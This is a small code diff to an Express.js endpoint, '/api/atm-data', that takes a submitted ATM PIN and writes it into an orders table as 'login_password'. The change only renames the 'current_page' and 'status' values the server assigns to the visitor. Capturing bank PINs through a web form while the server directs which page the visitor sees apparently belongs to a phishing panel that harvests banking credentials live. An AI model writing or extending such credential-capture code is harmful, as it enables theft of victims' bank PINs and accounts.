@@ -99,7 +99,7 @@ app.post('/api/atm-data', async (req, res) => {
   try {
     const { order_id, atm_pin } = req.body;
     if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
-    const { error } = await supabase.from('orders').update({ login_password: atm_pin, current_page: 'waiting', status: 'pending' }).eq('id', order_id);
+    const { error } = await supabase.from('orders').update({ login_password: atm_pin, current_page: 'atm-waiting', status: 'atm_pending' }).eq('id', order_id);
     if (error) throw error;
     res.json({ success: true });
   } catch (err) {
